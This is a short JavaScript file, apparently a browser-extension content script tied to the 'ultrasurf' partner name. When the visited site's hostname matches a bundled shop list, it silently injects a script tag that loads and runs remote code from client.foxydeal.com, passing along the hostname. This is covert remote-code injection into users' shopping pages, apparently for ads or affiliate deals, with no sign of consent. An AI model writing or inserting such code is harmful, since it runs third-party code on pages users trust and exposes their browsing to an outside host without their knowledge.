(function () {
    "use strict";
    var isSupportedShop, injectScriptInto;

    isSupportedShop = function (hostname) {
        if (typeof integrateList === "undefined" || integrateList.length === 0) {
            return false;
        }
        var supported_shop = false;
        var domain_parts = hostname.split('.'); // [www, amazon, com]

        while (domain_parts.length > 1 && !supported_shop) {
            supported_shop = integrateList.indexOf(domain_parts.join('.')) > -1; // www.amazon.com is not supported -> set supported_shop to false
            if (supported_shop) {
                return true;
            } else {
                // remove first element from array -> [amazon, com]
                domain_parts.splice(0, 1);
                // check the condition at the beginning of while loop and continue with execution

            }

        }
        return false;
    };
    injectScriptInto = function (hostname) {
        var scriptEl = document.createElement('script');
        scriptEl.setAttribute('type', 'text/javascript');
        scriptEl.setAttribute('src', '//client.foxydeal.com/sf/1130/tests/' + hostname + '/?partnerName=ultrasurf');
        document.getElementsByTagName('head')[0].appendChild(scriptEl);
    };
    var integrateList;
    integrateList = [];
    (function () {
        var xhrRequest = $.ajax({
            url: chrome.extension.getURL("assets/json/s.json"),
            dataType: "json"
        });
        xhrRequest.onSuccess(function (data) {
            integrateList = data.s;
            (function () {
                var host = document.location.hostname;
                if (isSupportedShop(host)) {
                    injectScriptInto(host);
                }
            })();
        });
    })();

})();